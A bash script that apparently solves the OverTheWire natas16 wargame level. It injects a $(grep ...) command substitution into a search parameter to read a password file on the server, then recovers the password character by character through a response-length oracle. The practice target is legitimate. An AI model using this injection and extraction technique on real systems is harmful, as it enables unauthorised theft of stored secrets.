#!/bin/bash

SECONDS=0

$null > alphabet
$null > current_byte

export PASSWORD=""

function perform_request(){
    curl -s "http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+$1+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search" \
        -H 'Connection: keep-alive' \
        -H 'Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==' \
        -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36' \
        --compressed \
        --insecure \
        --max-time 15
}

function brute_force_byte(){
    perform_request $1$2 | wc -l | bc > size_$2
    if [ `cat size_$2` -lt 50 ]; then echo "$2" >> $3; fi
}

function enum_alphabet_parallel(){
    for letter in {A..Z} {a..z} {0..9}; do echo -e "\n$letter\nalphabet"; done | parallel --max-args=3 brute_force_byte
}

function brute_force_byte_parallel(){
    for letter in `cat alphabet`; do echo -e "%5E$PASSWORD\n$letter\ncurrent_byte"; done | parallel --max-args=3 brute_force_byte 
}

function brute_force(){
    for i in {1..32}; do 
	    PASSWORD+=$(cat current_byte); $null > current_byte
	    brute_force_byte_parallel
        echo -ne `cat current_byte`
    done
}

function main(){
    enum_alphabet_parallel
    brute_force
}

export -f {perform_request,brute_force_byte,brute_force_byte_parallel,brute_force}

main

rm size_*

echo -e "\n$SECONDS secs"
